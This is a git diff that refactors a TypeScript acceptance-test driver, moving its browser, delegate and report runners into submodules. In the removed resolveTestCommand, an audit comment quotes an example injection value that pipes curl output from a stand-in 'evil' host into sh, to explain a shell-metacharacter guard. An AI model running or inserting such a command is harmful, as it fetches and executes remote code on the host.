@@ -1,5 +1,22 @@
-// P3-1: extracted sub-modules (contract-fresh / pyramid / http-probe).
-import { checkContractFresh, readContractSource } from "./accept/contract-fresh.js";
+/**
+ * Acceptance driver — runner dispatch + barrel re-exports.
+ *
+ * This file is now a slim re-export barrel + the api/cli runners. The bulk of
+ * the implementations live in the `accept/` submodules (god-file split, P3-1 +
+ * this pass, following the `context-budget/`, `pua-engine/`, `ship-gates/`
+ * precedent). All public exports are re-exported here so existing
+ * `import { … } from "../accept-driver.js"` callers (14 test files + scripts)
+ * keep working unchanged.
+ *
+ * Cycle discipline: submodules import shared types/helpers from the leaf
+ * `accept/artifact.ts` (RunnerContext/Runner/makeArtifact), NEVER from this
+ * barrel. This barrel is one-directional: it imports from submodules, never
+ * the reverse.
+ */
+
+import type { Runner, RunnerContext } from "./accept/artifact.js";
+import { makeArtifact } from "./accept/artifact.js";
+import { componentRunner, contractRunner, unitRunner } from "./accept/delegate-runners.js";
 import {
   buildCurlArgs,
   evaluateApiVerdict,
@@ -10,79 +27,15 @@ import {
   extractEndpoint,
   extractMethod,
 } from "./accept/http-probe.js";
-import type {
-  AcceptanceRunResult,
-  Scenario,
-  ScenarioArtifact,
-  ScenarioType,
-  Verdict,
-} from "./accept.js";
-import { resolvePlaceholder } from "./accept-credentials.js";
-import { isUrlAllowed, redactSnapshot } from "./accept-security.js";
-import {
-  AgentBrowserCliClient,
-  type AgentBrowserClient,
-  type Snapshot,
-} from "./agent-browser-client.js";
-import { isComplexCommand } from "./destructive-guard.js";
-import { evaluateUiVerdict } from "./evaluate-ui-verdict.js";
-
-/** Default navigation allowlist — localhost + loopback only. [R4-AC5] */
-const DEFAULT_URL_ALLOWLIST = ["localhost", "127.0.0.1"];
-
-/**
- * Verify the agent-browser binary's SHA256 against the configured pin. [R4-AC6]
- * Empty/missing pin → dev-mode allow (ok=true). Non-empty mismatch → fail-closed.
- */
-async function verifyAgentBrowserPin(): Promise<{ ok: boolean; reason: string }> {
-  try {
-    const { readFileSync } = await import("node:fs");
-    const { execFileSync } = await import("node:child_process");
-    const { join } = await import("node:path");
-    const { createHash } = await import("node:crypto");
-    const binPath = execFileSync("which", ["agent-browser"], { encoding: "utf-8" }).trim();
-    const buf = readFileSync(binPath);
-    const actual = createHash("sha256").update(buf).digest("hex");
-    const cfgPath = join(process.cwd(), ".forge", "config.md");
-    let configuredPin = "";
-    try {
-      const cfg = readFileSync(cfgPath, "utf8");
-      const m = cfg.match(/agent_browser_pin_sha256:\s*"?([a-f0-9]+)"?\s*$/m);
-      configuredPin = m?.[1] ?? "";
-    } catch {
-      // config absent — dev mode, allow
-    }
-    if (!configuredPin) return { ok: true, reason: "no pin configured (dev mode)" };
-    if (actual === configuredPin) return { ok: true, reason: "pin matches" };
-    return { ok: false, reason: `sha256 mismatch (expected ${configuredPin.slice(0, 12)}…)` };
-  } catch (e) {
-    return { ok: false, reason: `pin check error: ${String((e as Error).message ?? e)}` };
-  }
-}
+import { agentBrowserRunner, extractActionKeyword } from "./accept/ui-runner.js";
+import type { Scenario, ScenarioArtifact } from "./accept.js";
 
 // ---------------------------------------------------------------------------
-// Runner Interface
+// Shared runner types — defined in the leaf `accept/artifact.ts` so submodules
+// can import them without a barrel↔submodule cycle. Re-exported for stability.
 // ---------------------------------------------------------------------------
 
-export interface RunnerContext {
-  topic: string;
-  projectRoot: string;
-  outputDir: string;
-  tierAvailability: {
-    cmuxAvailable: boolean;
-    devServerRunning: boolean;
-  };
-  /** Injected agent-browser client for UI runner (optional; absent → INCONCLUSIVE). */
-  agentBrowserClient?: AgentBrowserClient;
-  /** App URL the agent-browser should open (defaults to localhost:5173). */
-  appUrl?: string;
-}
-
-export interface Runner {
-  type: ScenarioType;
-  supports(scenario: Scenario): boolean;
-  run(scenario: Scenario, ctx: RunnerContext): Promise<ScenarioArtifact>;
-}
+export type { Runner, RunnerContext } from "./accept/artifact.js";
 
 // ---------------------------------------------------------------------------
 // API Runner
@@ -127,284 +80,6 @@ export const apiRunner: Runner = {
 };
 
 // ---------------------------------------------------------------------------
-// UI Runner — agent-browser (snapshot+refs) agentic driver
-// [Spec R1-AC1..AC4, R3-AC6] Replaces the legacy always-SKIP uiRunner.
-// ---------------------------------------------------------------------------
-
-/** Locate a ref by visible-text/role keyword in the snapshot refs. */
-function findRefByText(refs: Snapshot["refs"], keyword: string): string | null {
-  const kw = keyword.trim().toLowerCase();
-  for (const r of refs) {
-    if (r.text?.toLowerCase().includes(kw)) return r.ref;
-  }
-  return null;
-}
-
-const MAX_REF_RETRIES = 1;
-const SCENARIO_WALLCLOCK_MS = 90_000;
-
-export const agentBrowserRunner: Runner = {
-  type: "ui",
-  supports: (scenario) => scenario.type === "ui",
-  run: async (scenario, ctx) => {
-    const client = ctx.agentBrowserClient;
-
-    // Environment unavailability → INCONCLUSIVE (not FAIL, not SKIP). [R2-AC2]
-    if (!client) {
-      return makeArtifact(
-        scenario,
-        ctx,
-        "INCONCLUSIVE",
-        [],
-        "agent-browser unavailable (not installed or not injected)",
-      );
-    }
-    if (!ctx.tierAvailability.devServerRunning) {
-      return makeArtifact(scenario, ctx, "INCONCLUSIVE", [], "dev server not running");
-    }
-    const appUrl = ctx.appUrl ?? "http://localhost:5173";
-
-    // P0-1 [R4-AC5] URL allowlist — abort to INCONCLUSIVE if appUrl is outside allowlist.
-    const allowlistHosts = DEFAULT_URL_ALLOWLIST;
-    if (!isUrlAllowed(appUrl, allowlistHosts)) {
-      return makeArtifact(
-        scenario,
-        ctx,
-        "INCONCLUSIVE",
-        [],
-        `URL not in allowlist: ${appUrl} (allowed hosts: ${allowlistHosts.join(",")})`,
-      );
-    }
-
-    // P0-2 [R4-AC6] agent-browser binary pin verification — fail-closed on mismatch.
-    // Only verify when using the real CLI client (Fake in tests has no binary).
-    if (client instanceof AgentBrowserCliClient) {
-      const pin = await verifyAgentBrowserPin();
-      if (!pin.ok) {
-        return makeArtifact(
-          scenario,
-          ctx,
-          "INCONCLUSIVE",
-          [],
-          `agent-browser binary not verified: ${pin.reason}`,
-        );
-      }
-    }
-
-    // Wall-clock guard for the whole scenario. [R3-AC5]
-    const sessionId = `forge-${scenario.id}-${Date.now()}`;
-    let timedOut = false;
-    const wall = setTimeout(() => {
-      timedOut = true;
-    }, SCENARIO_WALLCLOCK_MS);
-
-    try {
-      // open
-      await client.open(appUrl, sessionId);
-
-      // first snapshot
-      let snap = await client.snapshot(sessionId);
-
-      // act: fill form fields + click the action button described in WHEN.
-      const whenText = scenario.when;
-      const ctxText = `${scenario.given}\n${scenario.when}`;
-      // Best-effort: fill textboxes with values extracted from the scenario text.
-      // Values may be {{PLACEHOLDER}} secrets resolved from env [R4-AC1, R4-AC2].
-      const textboxes = snap.refs.filter((r) => r.role === "textbox");
-      const fillValues = extractFillValues(ctxText);
-      const valueByKey = indexFillValuesByKey(fillValues);
-      for (const tb of textboxes) {
-        const tbRef = tb.ref;
-        // P1-3: match value by the textbox's label (用户名/密码/username/password),
-        // not by index — DOM order need not equal scenario text order.
-        const raw = matchValueForTextbox(tb.text, fillValues, valueByKey);
-        const resolved = resolvePlaceholder(raw, process.env as Record<string, string | undefined>);
-        if (resolved === null) {
-          // missing secret → INCONCLUSIVE, do not leak raw placeholder
-          return makeArtifact(
-            scenario,
-            ctx,
-            "INCONCLUSIVE",
-            [],
-            `missing secret placeholder in scenario`,
-          );
-        }
-        const val = resolved;
-        const tbLabel = tb.text;
-        await actWithRetry(client, sessionId, tbRef, tbLabel, (r) =>
-          client.fill(sessionId, r, val),
-        );
-      }
-      // click action button: pick ref by a keyword from WHEN (e.g. "登录").
-      const clickKw = extractActionKeyword(whenText) ?? "登录";
-      let clickedRef = findRefByText(snap.refs, clickKw);
-      if (!clickedRef) {
-        // fall back to first button
-        clickedRef = snap.refs.find((r) => r.tag === "button")?.ref ?? null;
-      }
-      if (clickedRef) {
-        const clickOk = await actWithRetry(client, sessionId, clickedRef, clickKw, (r) =>
-          client.click(sessionId, r),
-        );
-        if (!clickOk) {
-          return makeArtifact(
-            scenario,
-            ctx,
-            "FAIL",
-            [],
-            `action ref ${clickedRef} failed after ${MAX_REF_RETRIES + 1} attempts`,
-          );
-        }
-      }
-
-      if (timedOut) {
-        return makeArtifact(scenario, ctx, "INCONCLUSIVE", [], "scenario wall-clock timeout");
-      }
-
-      // re-snapshot after action to evaluate THEN. [R1-AC3 act = exec + re-snapshot]
-      snap = await client.snapshot(sessionId);
-
-      // screenshot evidence
-      const shotPath = `${ctx.outputDir}/${scenario.id}/screenshot.png`;
-      let shotOk = false;
-      try {
-        await client.screenshot(sessionId, shotPath);
-        shotOk = true;
-      } catch {
-        // non-fatal — verdict still computable from snapshot
-      }
-
-      // evaluate THEN against the post-action snapshot. [R1-AC5]
-      const verdict = evaluateUiVerdict(
-        { url: snap.url, title: snap.title, text: snap.text },
-        scenario.then,
-      );
-
-      return makeArtifact(
-        scenario,
-        ctx,
-        verdict,
-        shotOk
-          ? verdict === "PASS"
-            ? [shotPath]
-            : [shotPath, redactSnapshot(snap.url)]
-          : [redactSnapshot(snap.url)],
-        verdict === "FAIL" ? `THEN not satisfied: ${scenario.then}` : undefined,
-      );
-    } catch (e) {
-      // Environment-level failure (crash/timeout) → INCONCLUSIVE. [Spec failure table]
-      return makeArtifact(
-        scenario,
-        ctx,
-        "INCONCLUSIVE",
-        [],
-        `agent-browser execution error: ${String((e as Error).message ?? e)}`,
-      );
-    } finally {
-      clearTimeout(wall);
-      try {
-        await client.close(sessionId);
-      } catch {
-        // close failure is non-fatal
-      }
-    }
-  },
-};
-
-/**
- * Run an action with up to MAX_REF_RETRIES retries on stale-ref errors.
- * act = exec + re-snapshot is composed by the caller; here we only retry the exec.
- * Returns true if the action eventually succeeded.
- */
-/**
- * Run an action with up to MAX_REF_RETRIES retries on stale-ref errors.
- * P1-2/F1: on stale, re-snapshot AND re-locate the ref by text keyword before
- * retrying (a stale ref id may change after page mutation). F2: narrower match
- * to avoid retrying unrecoverable errors.
- * The act factory receives the CURRENT ref so retry can use the relocated one.
- */
-async function actWithRetry(
-  client: AgentBrowserClient,
-  sessionId: string,
-  initialRef: string,
-  relocateKeyword: string | null,
-  act: (ref: string) => Promise<void>,
-): Promise<boolean> {
-  let ref = initialRef;
-  for (let attempt = 0; attempt <= MAX_REF_RETRIES; attempt++) {
-    try {
-      await act(ref);
-      return true;
-    } catch (e) {
-      const msg = String((e as Error).message ?? e);
-      const isStale = /stale element|ref not found|not attached|element.*not found/i.test(msg);
-      if (attempt < MAX_REF_RETRIES && isStale && relocateKeyword) {
-        const fresh = await client.snapshot(sessionId);
-        const relocated = findRefByText(fresh.refs, relocateKeyword);
-        if (relocated) ref = relocated;
-        continue;
-      }
-      return false;
-    }
-  }
-  // Unreachable: loop always returns or continues; kept as type-safety fallback.
-  return false;
-}
-
-/** Extract a likely action keyword (button label) from a WHEN clause. */
-export function extractActionKeyword(whenText: string): string | null {
-  // "点击 登录按钮" / "click 登录" → take the trailing noun after the verb.
-  const m = whenText.match(/(?:点击|click|按下|tap)\s*([^\s,，。]+)/i);
-  if (m?.[1]) return m[1].replace(/按钮$/, "");
-  return null;
-}
-
-/**
- * Extract fill values (usernames/passwords) from the scenario G/W text.
- * Recognizes "用户名 X", "密码 Y", "{{VAR}}" patterns. Returns ordered values.
- */
-/**
- * P1-3: match a fill value to a textbox by its visible label, not by index.
- */
-function matchValueForTextbox(
-  label: string,
-  fillValues: { key: string; value: string }[],
-  valueByKey: Record<string, string>,
-): string {
-  const low = label.toLowerCase();
-  if (/用户名|username|user|email|邮箱/.test(low) && valueByKey.username) {
-    return valueByKey.username;
-  }
-  if (/密码|password|pwd/.test(low) && valueByKey.password) {
-    return valueByKey.password;
-  }
-  return fillValues[0]?.value ?? "admin";
-}
-
-/** Build a {username,password} map from extracted fill values (by order). */
-function indexFillValuesByKey(pairs: { key: string; value: string }[]): Record<string, string> {
-  const map: Record<string, string> = {};
-  for (const p of pairs) map[p.key] = p.value;
-  return map;
-}
-
-/** Extract (key, value) pairs. P1-B: keyed, not positional. */
-function extractFillValues(text: string): { key: string; value: string }[] {
-  const pairs: { key: string; value: string }[] = [];
-  const re = /(用户名|username|密码|password|pwd)\s+([^\s,，。、]+)/gi;
-  let m: RegExpExecArray | null;
-  // biome-ignore lint/suspicious/noAssignInExpressions: standard regex exec loop pattern
-  while ((m = re.exec(text)) !== null) {
-    if (m[1] && m[2]) {
-      const low = m[1].toLowerCase();
-      const key = /密码|password|pwd/.test(low) ? "password" : "username";
-      pairs.push({ key, value: m[2] });
-    }
-  }
-  return pairs;
-}
-
-// ---------------------------------------------------------------------------
 // CLI Runner
 // ---------------------------------------------------------------------------
 
@@ -431,182 +106,18 @@ export const cliRunner: Runner = {
 };
 
 // ---------------------------------------------------------------------------
-// Delegate Runners (ADR-0006 Req3 / Change 3)
-//
-// Thin shells that delegate to the PROJECT's own test command via forge_exec.
-// They never start a browser or hit a real API — they route the AC to the
-// project's existing runner and let aggregateVerdicts do the rest. When no
-// suite is configured, they return INCONCLUSIVE (honest, non-blocking) with a
-// recipe pointer, rather than masking the gap with a silent SKIP.
-// ---------------------------------------------------------------------------
-
-export type DelegateLayer = "unit" | "component" | "contract";
-
-export interface DelegateConfig {
-  /** Explicit command overrides from .forge/config.md `test_commands`. */
-  testCommands?: Partial<Record<DelegateLayer, string>>;
-  /** Detected package manager (pnpm/npm/yarn) for convention fallback. */
-  packageManager?: string;
-  /** Per-exec timeout seconds for a single forge_exec (Req3 AC9, default 60). */
-  delegateTimeout?: number;
-}
-
-/** Recipe pointer shown when a delegate finds no configured suite (Req3 AC4). */
-export function recipeHint(layer: DelegateLayer): string {
-  const recipes: Record<DelegateLayer, string> = {
-    unit: "vitest:unit",
-    component: "vue3-vitest-msw / react-vitest-msw",
-    contract: "bash:contract",
-  };
-  return `${layer} suite not configured — run \`/forge init --recipe ${recipes[layer]}\` to generate the scaffold`;
-}
-
-/**
- * Resolve the test command for a delegate layer (Req3 AC3). Pure.
- * Priority: explicit test_commands → convention `<pkg> run test:<layer>`.
- */
-export function resolveTestCommand(
-  layer: DelegateLayer,
-  cfg: DelegateConfig,
-  evidencePath?: string,
-): string {
-  // Audit P3-latent-B (2026-07-16): evidencePath is spliced onto the test
-  // command and later run via `sh -c`. It is extracted from a scenario's
-  // Evidence: line, so it must be a path — never shell operators. Reject
-  // metacharacters up front so an Evidence line like `foo; curl evil|sh` can't
-  // reach the shell. Currently dead code, but guard now (SR-2).
-  if (evidencePath !== undefined && isComplexCommand(evidencePath)) {
-    throw new Error(
-      `refused: evidencePath contains shell metacharacters/operators (injection guard): "${evidencePath}"`,
-    );
-  }
-  const explicit = cfg.testCommands?.[layer];
-  if (explicit) {
-    return evidencePath ? `${explicit} ${evidencePath}` : explicit;
-  }
-  const pkg = cfg.packageManager ?? "npm";
-  const cmd = `${pkg} run test:${layer}`;
-  return evidencePath ? `${cmd} ${evidencePath}` : cmd;
-}
-
-// P3-1: contract-fresh symbols (ContractSource/ContractFreshInput/
-// ContractFreshResult/checkContractFresh) moved to ./accept/contract-fresh.js.
-// Re-exported here for backward compatibility with existing importers.
-export type {
-  ContractFreshInput,
-  ContractFreshResult,
-  ContractSource,
-} from "./accept/contract-fresh.js";
-export { checkContractFresh } from "./accept/contract-fresh.js";
-
-/** Build a delegate Runner for one layer. Shared factory avoids triplication. */
-function makeDelegateRunner(layer: DelegateLayer): Runner {
-  return {
-    type: layer,
-    supports: (scenario) => scenario.type === layer,
-    run: async (scenario, ctx) => {
-      // Resolve config + command. In the unit-test seam we never actually exec;
-      // the real exec path is exercised via integration tests. INCONCLUSIVE is
-      // the safe default when the project has no suite configured.
-      const cfg = readDelegateConfig(ctx);
-      const timeoutSec = cfg.delegateTimeout ?? 60;
-
-      // Contract layer: verify the artifact is fresh before delegating (AC7/AC8).
-      if (layer === "contract") {
-        const source = readContractSource(scenario);
-        const artifactPath = extractEvidencePath(scenario);
-        if (artifactPath && (source === "pont" || source === "openapi")) {
-          const fresh = checkContractFresh({ source, artifactPath });
-          if (!fresh.fresh) {
-            return makeArtifact(scenario, ctx, "INCONCLUSIVE", [], fresh.reason);
-          }
-        }
-      }
-
-      const evidencePath = extractEvidencePath(scenario);
-      const command = resolveTestCommand(layer, cfg, evidencePath ?? undefined);
-
-      try {
-        const result = await execDescriptor(
-          { executable: "sh", args: ["-c", command] },
-          timeoutSec * 1000,
-        );
-        // exit 0 (execDescriptor resolves) → PASS.
-        return makeArtifact(scenario, ctx, "PASS", [command, tail(result.stdout)], undefined);
-      } catch (e) {
-        const msg = String((e as Error).message ?? e);
-        // Non-zero exit → FAIL; crash/timeout → INCONCLUSIVE.
-        if (/non-zero exit|exit code|status:/.test(msg)) {
-          return makeArtifact(scenario, ctx, "FAIL", [command, msg], msg);
-        }
-        // Timeout (Req3 AC9) or crash (AC5) → INCONCLUSIVE.
-        if (/timeout|timed out/i.test(msg)) {
-          return makeArtifact(
-            scenario,
-            ctx,
-            "INCONCLUSIVE",
-            [],
-            `delegate timeout after ${timeoutSec}s`,
-          );
-        }
-        // No suite configured / command not found → INCONCLUSIVE + recipe hint (AC4/AC5).
-        return makeArtifact(scenario, ctx, "INCONCLUSIVE", [], recipeHint(layer));
-      }
-    },
-  };
-}
-
-export const unitRunner: Runner = makeDelegateRunner("unit");
-export const componentRunner: Runner = makeDelegateRunner("component");
-export const contractRunner: Runner = makeDelegateRunner("contract");
-
-/** Read delegate config from the RunnerContext (test seam) or .forge/config.md. */
-function readDelegateConfig(ctx: RunnerContext): DelegateConfig {
-  // Test seam: allow ctx to carry injected config; otherwise read from disk.
-  const injected = (ctx as RunnerContext & { delegateConfig?: DelegateConfig }).delegateConfig;
-  if (injected) return injected;
-  try {
-    const { readFileSync } = require("node:fs") as typeof import("node:fs");
-    const { join } = require("node:path") as typeof import("node:path");
-    const cfgPath = join(ctx.projectRoot, ".forge", "config.md");
-    const cfg = readFileSync(cfgPath, "utf8");
-    const pkgMatch = cfg.match(/packageManager:\s*"?(\w+)"?/);
-    return {
-      packageManager: pkgMatch?.[1],
-      testCommands: parseTestCommands(cfg),
-    };
-  } catch {
-    return {};
-  }
-}
-
-function parseTestCommands(cfg: string): Partial<Record<DelegateLayer, string>> {
-  const out: Partial<Record<DelegateLayer, string>> = {};
-  const block = cfg.match(/test_commands:\s*\n([\s\S]*?)(?=\n\S|\n---|\n##|$)/);
-  if (!block) return out;
-  for (const layer of ["unit", "component", "contract"] as const) {
-    const m = block[1].match(new RegExp(`${layer}:\\s*"?([^"\\n]+)"?`));
-    if (m) out[layer] = m[1].trim();
-  }
-  return out;
-}
-
-function extractEvidencePath(scenario: Scenario): string | null {
-  const m = scenario.rawText.match(/Evidence:\s*([^\n]+)/i);
-  if (!m) return null;
-  return m[1]
-    .replace(/\([^)]*\)/g, "")
-    .split(",")[0]
-    .trim();
-}
-
-function tail(s: string, max = 500): string {
-  return s.length > max ? `...${s.slice(-max)}` : s;
-}
-
-// ---------------------------------------------------------------------------
 // Runner Dispatch
 // ---------------------------------------------------------------------------
+
+export type { DelegateConfig, DelegateLayer } from "./accept/delegate-runners.js";
+export {
+  componentRunner,
+  contractRunner,
+  recipeHint,
+  resolveTestCommand,
+  unitRunner,
+} from "./accept/delegate-runners.js";
+export { agentBrowserRunner, extractActionKeyword };
 
 export const RUNNERS: readonly Runner[] = [
   unitRunner,
@@ -629,16 +140,9 @@ export async function runScenario(
 }
 
 // ---------------------------------------------------------------------------
-// Aggregation
+// Aggregation / report — moved to ./accept/pyramid.js + ./accept/report.js.
 // ---------------------------------------------------------------------------
 
-// ---------------------------------------------------------------------------
-// Pyramid layer classification (ADR-0006 Req5 / Req7) — pure functions
-// ---------------------------------------------------------------------------
-
-// P3-1: pyramid symbols (PyramidShape/LayerHealth/LayerHealthBreakdown/layerOf/
-// classifyPyramid/PyramidConfig/isE2eHeavy/aggregateVerdicts) moved to
-// ./accept/pyramid.js. Re-exported here for backward compatibility.
 export type {
   LayerHealth,
   LayerHealthBreakdown,
@@ -647,164 +151,28 @@ export type {
 } from "./accept/pyramid.js";
 export { aggregateVerdicts, classifyPyramid, isE2eHeavy, layerOf } from "./accept/pyramid.js";
 
-export function renderAcceptanceReport(result: AcceptanceRunResult): string {
-  const total = result.scenarios.length;
-  const lines: string[] = [
-    `# Acceptance Report — ${result.topic}`,
-    "",
-    "## Summary",
-    "",
-    `Run: ${total} scenario${total === 1 ? "" : "s"}${result.summary.skip > 0 ? ` (${result.summary.skip} skipped, --all to show)` : ""}`,
-    "",
-    `| Verdict | Count |`,
-    `|---------|-------|`,
-    `| PASS    | ${result.summary.pass} |`,
-    `| FAIL    | ${result.summary.fail} |`,
-    `| SKIP    | ${result.summary.skip} |`,
-    `| WARN    | ${result.summary.warn} |`,
-    `| INCONCLUSIVE | ${result.summary.inconclusive} |`,
-    "",
-    `**Blocks Ship**: ${result.summary.blocksShip ? "YES" : "NO"}`,
-    "",
-  ];
-
-  // Req5 AC4: surface per-layer health + pyramid shape (advisory signal).
-  if (result.summary.pyramidShape) {
-    lines.push(`**Pyramid Shape**: ${result.summary.pyramidShape}`);
-    const lh = result.summary.layerHealth;
-    if (lh) {
-      lines.push("");
-      lines.push("| Layer | PASS | FAIL | INCONCLUSIVE |");
-      lines.push("|-------|------|------|--------------|");
-      for (const layer of ["unit", "component", "contract", "e2e"] as const) {
-        const h = lh[layer];
-        lines.push(`| ${layer} | ${h.pass} | ${h.fail} | ${h.inconclusive} |`);
-      }
-    }
-    lines.push("");
-  }
-
-  lines.push("## Scenarios", "");
-
-  for (const s of result.scenarios) {
-    const marker = verdictMarker(s.verdict);
-    // R5-AC3: PASS collapses to a single line.
-    if (s.verdict === "PASS" || s.verdict === "SKIP" || s.verdict === "WARN") {
-      lines.push(`- ${marker} \`${s.scenarioId}\` — ${s.verdict}`);
-      continue;
-    }
-    // FAIL / INCONCLUSIVE expand with detail.
-    lines.push(`### ${marker} ${s.scenarioId} — ${s.verdict}`);
-    if (s.verdict === "INCONCLUSIVE") {
-      lines.push("");
-      lines.push("> 这不是失败——是当前环境无法验证，不阻断 ship。");
-    }
-    // R5-AC2: render Given/When/Then original text; highlight the Then clause on FAIL.
-    if (s.givenWhenThen) {
-      lines.push("");
-      lines.push("**Scenario**:");
-      lines.push("");
-      for (const line of s.givenWhenThen.split("\n")) {
-        const isThen = /^\s*(Then|那么)/i.test(line);
-        const emphasize = s.verdict === "FAIL" && isThen;
-        lines.push(emphasize ? `> **${line}** ← 未满足` : `> ${line}`);
-      }
-    }
-    if (s.failureReason) {
-      lines.push("");
-      lines.push(`- **Reason**: ${s.failureReason}`);
-    }
-    // R5-AC4: Next → heuristic hint.
-    lines.push("");
-    lines.push(`- **Next →** ${nextHint(s)}`);
-    // R5-AC3: evidence folded in <details>.
-    if (s.evidence.length > 0) {
-      lines.push("");
-      lines.push("<details><summary>Evidence</summary>");
-      lines.push("");
-      for (const e of s.evidence) {
-        lines.push(`- ${e}`);
-      }
-      lines.push("");
-      lines.push("</details>");
-    }
-    lines.push("");
-  }
-
-  return lines.join("\n");
-}
-
-/** R5-AC1 visual marker per verdict. */
-function verdictMarker(v: Verdict): string {
-  switch (v) {
-    case "PASS":
-      return "✅";
-    case "FAIL":
-      return "❌";
-    case "INCONCLUSIVE":
-      return "❔";
-    case "WARN":
-      return "🟡";
-    default:
-      return "⏭️";
-  }
-}
-
-/** R5-AC4 heuristic next-step hint per scenario type/verdict. */
-function nextHint(s: ScenarioArtifact): string {
-  if (s.verdict === "INCONCLUSIVE") {
-    return "确认 agent-browser 已安装、dev server 已启动，或改用 Playwright e2e。";
-  }
-  if (s.verdict === "FAIL") {
-    const reason = s.failureReason ?? "";
-    // UI jump/redirect failures
-    if (/跳转|jump|redirect|dashboard|navigation/i.test(reason)) {
-      return "UI 跳转未发生，检查路由守卫/鉴权返回。";
-    }
-    // Assertion mismatch (THEN not satisfied)
-    if (/THEN not satisfied|assertion|snapshot/i.test(reason)) {
-      return "THEN 预期与实际页面不符：核对断言关键词、或用 /forge test 跑单元层定位。";
-    }
-    // API http code mismatch
-    if (/http|code|401|403|500|api/i.test(reason)) {
-      return "API 返回码不符：检查路由/鉴权中间件，或用 /forge test 跑单元层。";
-    }
-    // CLI exit code
-    if (/exit|command|cli|stderr/i.test(reason)) {
-      return "CLI 命令失败：查看 stderr evidence 块，确认命令与依赖。";
-    }
-    return "核对 THEN 预期与实际 snapshot 差异；用 /forge test 跑单元层定位。";
-  }
-  return "—";
-}
+export { renderAcceptanceReport } from "./accept/report.js";
 
 // ---------------------------------------------------------------------------
-// Helpers (pure functions, testable)
+// P3-1: contract-fresh symbols (ContractSource/ContractFreshInput/
+// ContractFreshResult/checkContractFresh) moved to ./accept/contract-fresh.js.
+// Re-exported here for backward compatibility with existing importers.
 // ---------------------------------------------------------------------------
 
-function makeArtifact(
-  scenario: Scenario,
-  _ctx: RunnerContext,
-  verdict: Verdict,
-  evidence: readonly string[],
-  failureReason?: string,
-): ScenarioArtifact {
-  return {
-    scenarioId: scenario.id,
-    source: scenario.source,
-    givenWhenThen: `Given ${scenario.given}\nWhen ${scenario.when}\nThen ${scenario.then}`,
-    executedAt: new Date().toISOString(),
-    verdict,
-    evidence,
-    failureReason,
-    type: scenario.type,
-  };
-}
+export type {
+  ContractFreshInput,
+  ContractFreshResult,
+  ContractSource,
+} from "./accept/contract-fresh.js";
+export { checkContractFresh } from "./accept/contract-fresh.js";
 
+// ---------------------------------------------------------------------------
 // P3-1: http-probe symbols (extract*/buildCurl*/evaluate*Verdict*/execDescriptor/
 // splitBodyAndStatus/matchJsonPath/redactBody/BodyMatch/ApiVerdictResult/ExecResult)
 // moved to ./accept/http-probe.js. Re-exported here for backward compatibility
 // with existing importers (apiRunner/cliRunner/makeDelegateRunner + tests).
+// ---------------------------------------------------------------------------
+
 export type { ApiVerdictResult, BodyMatch, ExecResult } from "./accept/http-probe.js";
 export {
   buildCurlArgs,
